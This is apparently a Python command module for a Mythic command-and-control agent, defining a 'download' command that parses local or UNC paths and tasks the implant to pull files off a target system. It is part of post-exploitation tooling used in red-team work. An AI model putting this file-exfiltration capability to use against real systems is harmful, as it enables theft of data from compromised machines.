from mythic_container.MythicCommandBase import *
import json
import re


class DownloadArguments( TaskArguments ):

    def __init__( self, command_line, **kwargs ):
        super().__init__( command_line, **kwargs )
        self.args = [
            CommandParameter(
                name         = "path",
                cli_name     = "path",
                display_name = "Path to file to download.",
                type         = ParameterType.String,
                description  = "File to download.",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required    = True,
                        group_name  = "Default",
                        ui_position = 1
                    )
                ]
            ),
        ]

    async def parse_dictionary(self, dictionary_arguments):
        logger.info( dictionary_arguments );
        logger.info( self.tasking_location );

        self.load_args_from_dictionary( dictionary_arguments );
        if "host" in dictionary_arguments:
            if "full_path" in dictionary_arguments:
                self.add_arg("path", f'\\\\{dictionary_arguments["host"]}\\{dictionary_arguments["full_path"]}')
            elif "path" in dictionary_arguments:
                self.add_arg("path", f'\\\\{dictionary_arguments["host"]}\\{dictionary_arguments["path"]}')
            elif "file" in dictionary_arguments:
                self.add_arg("path", f'\\\\{dictionary_arguments["host"]}\\{dictionary_arguments["file"]}')
            else:
                logger.info("unknown dictionary args")
        else:
            if "path" not in dictionary_arguments or dictionary_arguments["path"] is None:
                self.add_arg("path", f'.')

    async def parse_arguments(self):
        # Check if named parameters were defined
        args = {"path": "."}
        if len(self.raw_command_line) > 0:
            args["path"] = self.raw_command_line
        self.load_args_from_dictionary(args)


class DownloadCommand( CommandBase ):
    cmd         = "download";
    needs_admin = False;
    help_cmd    = "download [-path <file_path>]";
    description = "Download a file off the target system\nBehavior: Native Code\n";
    version     = 1;
    supported_ui_features = ["file_browser:download"];
    author      = "@ Oblivion";
    argument_class = DownloadArguments;
    browser_script = BrowserScript( script_name = "download", author = "@ Oblivion", for_new_ui=True );
    attributes = CommandAttributes(
        suggested_command=True,
    );

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.task.ID,
            Success=True,
        )
        path = taskData.args.get_arg("path")
        response.DisplayParams = path

        if uncmatch := re.match(
            r"^\\\\(?P<host>[^\\]+)\\(?P<path>.*)$",
            path,
        ):
            taskData.args.add_arg("host", uncmatch.group("host"))
            taskData.args.set_arg("path", uncmatch.group("path"))
        else:
            taskData.args.add_arg("host", "")
        if host := taskData.args.get_arg("host"):
            host = host.upper()

            if host == "127.0.0.1" or host.lower() == "localhost":
                host = taskData.Callback.Host

            taskData.args.set_arg("host", host)
        taskData.args.add_arg("file", taskData.args.get_arg("path"));

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse( TaskID = task.Task.ID, Success = True )
        return resp